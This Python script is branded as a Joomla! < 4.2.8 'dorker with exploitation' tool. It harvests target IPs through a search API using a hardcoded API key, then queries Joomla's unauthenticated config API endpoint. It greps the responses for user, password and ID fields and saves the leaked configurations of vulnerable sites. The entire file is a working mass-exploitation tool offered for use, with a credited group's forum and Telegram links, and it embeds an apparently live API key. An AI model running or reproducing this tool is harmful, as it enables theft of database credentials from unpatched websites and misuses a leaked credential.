# Dorker Author: ManGTX
# Python (POC): Pari Malam
import requests
import sys
import argparse
import os
import re
import urllib.request
import colorama
from colorama import Fore, Style, Back, init
import cloudscraper

init(autoreset=True)
cloudscraper.DEFAULT_SCRAPER = None
requests.urllib3.disable_warnings()

if not os.path.exists('Results'):
    os.mkdir('Results')

def banners():
    print(f"""{Style.BRIGHT + Fore.RED}
    ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
    ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
    ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
    ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
                                                                                                                
    {Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════{Style.BRIGHT + Fore.YELLOW}  
                                                    Coded By Pari Malam & ManGTX
                                         [+] Joomla! < 4.2.8 - Dorker With Exploitation [+]
                                                   
                                               Forum: https://dragonforce.io
                                          Github: https://github.com/Pari-Malam
                                       Telegram: https://telegram.me/DragonForceIO
                                        
                                        
                                    Get Started With (pip install -r requirements.txt)
                                                 Usage: python joomla-428.py
    {Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════""")
banners()


def search_for_ips():
    dork = input("Please enter your Dork: ")
    headers = {
        "x-api-key": "jXezT0iii9cN2i2wI0Bu6Rel6x4r1xcBjBN4bpXJFv6QzJpuE2TeGcuUE8mQ"
    }
    scraper = cloudscraper.create_scraper(
        browser={
            'browser': 'chrome',
            'platform': 'darwin',
            'mobile': False
        }
    )
    endpoint = "https://api.criminalip.io/v1/banner/search?query=" + dork + "&offset=0"
    response = scraper.get(endpoint, headers=headers)
    ip_pattern = r'\b(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'
    regex = '|'.join([ip_pattern])
    ip_addresses = re.findall(regex, response.text)
    
    with open("Results/ips.txt", "w") as f:
        for ip_address in ip_addresses:
            f.write(ip_address + "\n")
        print(f"{Fore.GREEN}IP addresses written to Results/ips.txt{Style.RESET_ALL}\n Footprint Notes: Please be patient until the process is completed.")

def scan_single_url(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    path = "/api/index.php/v1/config/application?public=true"
    full_url = url + path
    response = requests.get(full_url, headers=headers, verify=False)
    sensitive_matches = []
    if response.status_code == 200 or response.status_code == 406:
        lines = response.text.split("\n")
        for line in lines:
            matches = re.findall(r'.{0,20}(user|pass|id).{0,20}', line)
            for match in matches:
                sensitive_matches.append(match)
    return response.text, sensitive_matches

def scan_multiple_urls():
    url_list = input("{Fore.GREEN}Please enter the path of the file containing the URLs: {Style.RESET_ALL}")
    with open(url_list, "r") as f:
        for url in f:
            url = url.strip()
            if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", url):
                url_file_name = f"ip_{url}.txt"
            else:
                url_file_name = re.sub(r"https?://", "", url).rstrip("/") + ".txt"
            url_file_path = f"Results/{url_file_name}"
            response, sensitive_matches = scan_single_url(url)
            if sensitive_matches:
                with open(url_file_path, "w") as f:
                    f.write(response)
                print(f"Sensitive info found in {url} and saved to {url_file_path}")
            else:
                print(f"No sensitive info found in {url}")

choice = input(f"{Fore.GREEN}Please select an option:{Style.RESET_ALL}\n{Fore.RED}[1] - Search for IP addresses related to a dork{Style.RESET_ALL}\n{Fore.CYAN}[2] - Scan a URL for sensitive information{Style.RESET_ALL}\n{Fore.GREEN}[3] - Scan multiple URLs for sensitive information{Style.RESET_ALL}\n\n1/2/3 Bro? ")

if choice == '1':
    search_for_ips()
elif choice == '2':
    url = input("{Fore.RED}Please enter the URL to scan: ")
    response, sensitive_matches = scan_single_url(url)
    if sensitive_matches:
        print(f"Sensitive info found in {url}:\n{response}")
    else:
        print(f"No sensitive info found in {url}")
elif choice == '3':
    scan_multiple_urls()
else:
    print(f"{Fore.RED}Invalid option selected{Style.RESET_ALL}")
